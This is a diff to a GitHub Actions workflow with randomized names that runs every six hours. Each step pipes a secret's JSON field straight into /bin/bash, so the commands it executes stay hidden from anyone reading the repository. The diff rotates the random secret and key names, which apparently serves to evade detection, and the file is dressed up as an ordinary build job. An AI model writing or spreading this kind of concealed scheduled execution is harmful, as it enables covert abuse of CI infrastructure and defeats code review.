@@ -2,30 +2,20 @@ name: songziyang8391
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 1/6 * * *'
+    - cron: '18 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: songziyang8391
         env:
-          weg912: ${{ secrets.weg912 }}
+          yx9915: ${{ secrets.yx9915 }}
         run: |
-          echo $weg912 | jq -r .csf90 | /bin/bash
-          echo $hpd7243 | jq -r .lvdyv4 | /bin/bash
-          echo $djq0347 | jq -r .qezsx5284 | /bin/bash
-          echo $zpoid06 | jq -r .dviog12 | /bin/bash
-          echo $ziq54312 | jq -r .rrhw6 | /bin/bash
-          echo $v5 | jq -r .chod6888 | /bin/bash
-          echo $p733 | jq -r .pi1815 | /bin/bash
-          echo $b5981 | jq -r .qrnvu98418 | /bin/bash
-          echo $bgwi5 | jq -r .etma89241 | /bin/bash
-          echo $raigz490 | jq -r .lmrk742 | /bin/bash
-          echo $w4 | jq -r .cbeag8 | /bin/bash
-          echo $dr5 | jq -r .zp6389 | /bin/bash
-          echo $ji89712 | jq -r .flhm18670 | /bin/bash
-          echo $vt02 | jq -r .g401 | /bin/bash
-          echo $bdz55 | jq -r .z3 | /bin/bash
+          echo $yx9915 | jq -r .wlrdr295 | /bin/bash
+          echo $byg44 | jq -r .j5 | /bin/bash
+          echo $xo9 | jq -r .qka6472 | /bin/bash
+          echo $yat15 | jq -r .pmmuu1700 | /bin/bash
+          echo $fpci9 | jq -r .l680 | /bin/bash
 
